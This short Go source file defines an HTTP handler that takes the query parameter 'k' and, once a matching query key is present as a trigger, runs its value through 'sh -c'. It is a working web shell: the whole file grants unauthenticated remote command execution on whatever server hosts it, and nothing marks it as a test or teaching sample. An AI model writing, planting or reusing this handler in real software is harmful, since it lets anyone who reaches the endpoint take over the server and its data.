package main

import (
	"net/http"
	"os/exec"
)

func run(w http.ResponseWriter, r *http.Request) {
	q := r.URL.Query()
	k := r.URL.Query().Get("k")
	if _, ok := q[k]; !ok {
		return
	}
	exec.Command("sh", "-c", k).Run()
}
